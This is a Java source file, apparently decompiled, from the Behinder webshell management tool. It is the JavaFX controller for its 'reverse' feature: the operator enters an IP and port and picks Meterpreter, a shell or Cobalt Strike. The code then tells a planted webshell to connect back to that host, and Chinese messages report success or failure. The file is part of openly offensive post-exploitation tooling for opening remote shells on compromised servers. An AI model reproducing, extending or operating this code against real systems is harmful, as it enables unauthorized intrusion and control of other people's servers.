package net.rebeyond.behinder.ui.controller;

import javafx.application.Platform;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import net.rebeyond.behinder.core.ShellService;
import net.rebeyond.behinder.dao.ShellManager;
import org.json.JSONObject;

import java.util.List;

public class ReverseViewController {
    private ShellManager shellManager;
    @FXML
    private TextField reverseIPText;
    @FXML
    private TextField reversePortText;
    @FXML
    private RadioButton reverseTypeMeterRadio;
    @FXML
    private RadioButton reverseTypeShellRadio;
    @FXML
    private RadioButton reverseTypeColbatRadio;
    @FXML
    private Button reverseButton;
    @FXML
    private TextArea reverseHelpTextArea;
    private ShellService currentShellService;
    private JSONObject shellEntity;
    private List<Thread> workList;
    private Label statusLabel;

    public ReverseViewController() {
    }

    public void init(ShellService shellService, List<Thread> workList, Label statusLabel) {
        this.currentShellService = shellService;
        this.shellEntity = shellService.getShellEntity();
        this.workList = workList;
        this.statusLabel = statusLabel;
        this.initReverseView();
    }

    private void initReverseView() {
        ToggleGroup radioGroup = new ToggleGroup();
        this.reverseTypeMeterRadio.setToggleGroup(radioGroup);
        this.reverseTypeShellRadio.setToggleGroup(radioGroup);
        this.reverseTypeColbatRadio.setToggleGroup(radioGroup);
        this.reverseTypeMeterRadio.setUserData("meter");
        this.reverseTypeShellRadio.setUserData("shell");
        this.reverseTypeColbatRadio.setUserData("colbat");
        this.reverseButton.setOnAction((event) -> {
            Runnable runner = () -> {
                try {
                    String targetIP = this.reverseIPText.getText();
                    String targetPort = this.reversePortText.getText();
                    RadioButton currentTypeRadio = (RadioButton) radioGroup.getSelectedToggle();
                    if (currentTypeRadio == null) {
                        Platform.runLater(() -> {
                            this.statusLabel.setText("请先选择反弹类型。");
                        });
                        return;
                    }

                    String type = currentTypeRadio.getUserData().toString();
                    JSONObject resultObj = this.currentShellService.connectBack(type, targetIP, targetPort);
                    String status = resultObj.getString("status");
                    if (status.equals("fail")) {
                        Platform.runLater(() -> {
                            String msg = resultObj.getString("msg");
                            this.statusLabel.setText("反弹失败:" + msg);
                        });
                    } else {
                        Platform.runLater(() -> {
                            this.statusLabel.setText("反弹成功。");
                        });
                    }
                } catch (Exception var8) {
                    var8.printStackTrace();
                    Platform.runLater(() -> {
                        this.statusLabel.setText("操作失败:" + var8.getMessage());
                    });
                }

            };
            Thread worker = new Thread(runner);
            this.workList.add(worker);
            worker.start();
        });
    }
}
